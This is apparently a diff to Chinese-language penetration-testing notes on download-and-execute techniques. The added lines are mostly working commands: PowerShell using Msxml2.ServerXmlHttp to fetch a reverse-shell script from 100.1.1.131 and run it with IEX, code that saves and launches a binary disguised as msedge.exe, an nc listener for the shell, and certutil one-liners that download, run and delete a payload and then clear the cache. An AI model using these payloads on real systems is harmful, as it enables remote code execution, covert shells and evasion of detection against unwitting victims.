@@ -881,17 +881,37 @@ cmd.exe /k < \webdavserver\folder\batchfile.txt
 
 ![image-20240626222248971](http://cdn.ayusummer233.top/DailyNotes/202406262222277.png)
 
-
-
-
-
-
-
 ---
 
 #### Msxml2.ServerXmlHttp
 
 Microsoft XML (MSXML) 是一个开放源代码的 XML 解析器和 HTTP 客户端，由 Microsoft 提供。它是 Windows 操作系统的一部分，并且可以在各种编程语言中使用，包括 C++、Java、VBScript、JavaScript 等。
+
+---
+
+`下载与执行powershell命令文本`
+
+```powershell
+# 新建一个 COM 对象, 它是 Msxml2.ServerXmlHttp 类的一个实例, 用于发送 HTTP 请求和接受响应
+$comMsXml = New-Object -ComObject MsXml2.ServerXmlHttp; 
+# 使用 COM 对象的 Open 方法打开一个 HTTP GET 请求; $False 表示同步请求(非异步)
+$comMsXml.Open('GET', 'http://100.1.1.131:8000/download/download_and_exec_reverse_shell_exe.ps1', $False); 
+# 使用 COM 对象的 Send 方法发送 HTTP 请求并等待响应, 响应会被保存在 COM 对象的 ResponseText 属性中
+$comMsXml.Send(); 
+Write-Host $comMsXml.ResponseText
+# Invoke-Expression 执行响应(中的脚本)
+IEX $comMsXml.ResponseText
+```
+
+```zsh
+nc -lvvp 65521 | while read line; do echo "$(date '+%Y-%m-%d %H:%M:%S') $line";done
+```
+
+![image-20240708175434662](http://cdn.ayusummer233.top/DailyNotes/202407081754928.png)
+
+---
+
+`下载与执行文件`
 
 ```powershell
 # 新建一个 COM 对象, 它是 Msxml2.ServerXmlHttp 类的一个实例, 用于发送 HTTP 请求和接受响应
@@ -900,10 +920,17 @@ $comMsXml = New-Object -ComObject MsXml2.ServerXmlHttp;
 $comMsXml.Open('GET', 'http://100.1.1.131:8000/download/msedge.exe', $False); 
 # 使用 COM 对象的 Send 方法发送 HTTP 请求并等待响应, 响应会被保存在 COM 对象的 ResponseText 属性中
 $comMsXml.Send(); 
-Write-Host $comMsXml.ResponseText
-# Invoke-Expression 执行响应(中的脚本)
-IEX $comMsXml.ResponseText
+# 获取文件的字节数组
+$fileBytes = $comMsXml.ResponseBody;
+# 定义文件保存路径
+$filePath = "C:\temp\msedge.exe";
+# 将字节数组写入到文件
+[System.IO.File]::WriteAllBytes($filePath, $fileBytes);
+# 执行下载的文件
+Start-Process -FilePath $filePath
 ```
+
+![image-20240708175813560](http://cdn.ayusummer233.top/DailyNotes/202407081758793.png)
 
 ---
 
@@ -1008,9 +1035,20 @@ Rename-Item -Path [xxx].bin -NewName test.exe
 
 一条龙上线后删除文件和缓存:
 
-```powershell
+```cmd
 certutil -urlcache -split -f http://site.com/a a.exe && a.exe &&  del a.exe && certutil -urlcache -split -f http://192.168.254.102:80/a delete
+cmd.exe /c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe && a.exe &&  del a.exe && certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete
 ```
+
+![image-20240708174552700](http://cdn.ayusummer233.top/DailyNotes/202407081745921.png)
+
+---
+
+```powershell
+certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe b.exe; b.exe; del b.exe;certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete
+```
+
+![image-20240708174435965](http://cdn.ayusummer233.top/DailyNotes/202407081744291.png)
 
 
 ---
